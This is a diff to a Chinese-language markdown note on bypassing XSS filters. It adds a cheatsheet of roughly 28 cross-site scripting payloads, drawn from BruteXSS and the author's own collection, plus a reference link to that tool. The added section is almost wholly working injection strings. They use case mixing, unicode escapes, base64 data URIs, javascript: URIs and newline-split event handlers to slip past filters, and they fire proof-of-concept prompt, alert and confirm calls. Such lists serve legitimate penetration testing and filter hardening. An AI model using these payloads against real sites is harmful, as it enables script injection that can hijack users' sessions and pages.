@@ -82,9 +82,43 @@ js中會用正規表達式來過濾危險字符，參考如下文件：
 // 這種payload也可以繞過括號過濾
 ```
 
+## Cheatsheet
+```js
+</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+</script>"><script>prompt(1)</script>
+</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
+"><script>al\u0065rt(document.domain)</script>
+"><script>al\u{65}rt(document.domain)</script>
+"><img src=x onerror=prompt(1)>
+"><svg/onload=prompt(1)>
+"><iframe/src=javascript:prompt(1)>
+"><h1 onclick=prompt(1)>Clickme</h1>
+"><a href=javascript:prompt(1)>Clickme</a>
+"><a href="javascript:confirm%28 1%29">Clickme</a>
+"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
+"><textarea autofocus onfocus=prompt(1)>
+"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
+"><script>co\u006efir\u006d`1`</script>
+"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
+"><img src=x onerror=co\u006efir\u006d`1`>
+"><svg/onload=co\u006efir\u006d`1`>
+"><iframe/src=javascript:co\u006efir\u006d%28 1%29>
+"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
+"><a href=javascript:prompt%28 1%29>Clickme</a>
+"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
+"><textarea autofocus onfocus=co\u006efir\u006d(1)>
+"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
+"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+"><img/src=x%0Aonerror=prompt`1`>
+"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
+"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
+```
+The cheatsheet include brutexss original payload and my collection!  
+
 ## Reference
 1. The Web Application Hacker's Handbook  
 2. [看雪](https://www.kanxue.com)  
 3. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
 4. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
-5. [freebuf](http://www.freebuf.com/articles/web/153055.html)
+5. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
+6. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)
